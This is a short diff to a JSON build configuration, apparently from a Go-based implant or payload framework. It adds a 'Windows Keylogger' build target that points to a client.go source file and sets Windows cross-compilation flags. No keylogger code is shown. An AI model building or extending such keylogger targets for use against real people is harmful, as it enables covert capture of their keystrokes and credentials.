@@ -22,5 +22,13 @@
         "flags": "-trimpath -ldflags",
         "environment": "GOOS=windows GOARCH=amd64",
         "file_suffix": ".exe"
+    },
+    "windows/privileged": {
+        "type": "Windows Keylogger",
+        "description": "windows keylogger",
+        "code_path": "windows/privileged/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "GOOS=windows GOARCH=amd64",
+        "file_suffix": ".exe"
     }
 }
